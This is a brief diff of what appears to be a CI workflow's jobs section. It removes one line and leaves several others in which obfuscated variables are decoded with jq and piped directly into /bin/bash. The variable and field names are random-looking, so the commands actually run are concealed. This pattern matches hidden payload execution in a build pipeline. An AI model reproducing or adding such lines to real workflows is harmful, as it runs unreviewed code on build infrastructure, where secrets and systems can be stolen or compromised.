@@ -27,7 +27,6 @@ jobs:
           echo $ie4834 | jq -r .kw3 | /bin/bash
           echo $rgq97 | jq -r .oqfc1449 | /bin/bash
           echo $j88 | jq -r .x8 | /bin/bash
-          printf '%s' "$ue230" | jq -r .w6545 | /bin/bash
           printf '%s' "$ea06" | jq -r .lgvn78602 | /bin/bash
           echo $gd5 | jq -r .y627 | /bin/bash
           echo $xph32 | jq -r .kck96 | /bin/bash
